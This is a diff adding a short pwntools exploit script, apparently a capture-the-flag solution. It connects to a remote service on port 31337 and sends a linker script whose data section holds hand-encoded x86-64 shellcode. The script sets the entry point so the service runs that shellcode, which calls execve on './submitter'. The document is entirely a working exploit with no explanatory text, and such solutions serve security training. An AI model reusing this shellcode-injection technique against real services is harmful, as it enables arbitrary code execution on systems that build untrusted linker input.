@@ -1,0 +1,62 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+HOST = os.environ.get('HOST', 'localhost')
+PORT = 31337
+
+io = remote(HOST, int(PORT))
+ld = '''\
+SECTIONS
+{
+    .text 0x1000 :
+    {
+        *(.text*)
+        *(.text)
+    }
+    .data : {
+	    BYTE(0x68)
+BYTE(0x75)
+BYTE(0x64)
+BYTE(0x73)
+BYTE(0x01)
+BYTE(0x81)
+BYTE(0x34)
+BYTE(0x24)
+BYTE(0x01)
+BYTE(0x01)
+BYTE(0x01)
+BYTE(0x01)
+BYTE(0x48)
+BYTE(0xb8)
+BYTE(0x2e)
+BYTE(0x2f)
+BYTE(0x73)
+BYTE(0x75)
+BYTE(0x62)
+BYTE(0x6d)
+BYTE(0x69)
+BYTE(0x74)
+BYTE(0x50)
+BYTE(0x48)
+BYTE(0x89)
+BYTE(0xe7)
+BYTE(0x31)
+BYTE(0xd2)
+BYTE(0x31)
+BYTE(0xf6)
+BYTE(0x6a)
+BYTE(0x3b)
+BYTE(0x58)
+BYTE(0x0f)
+BYTE(0x05)
+ }
+    start = 0x1189;
+    ENTRY(start)
+}
+
+
+'''
+io.send(ld)
+# io.interactive()
+print(io.recvall())
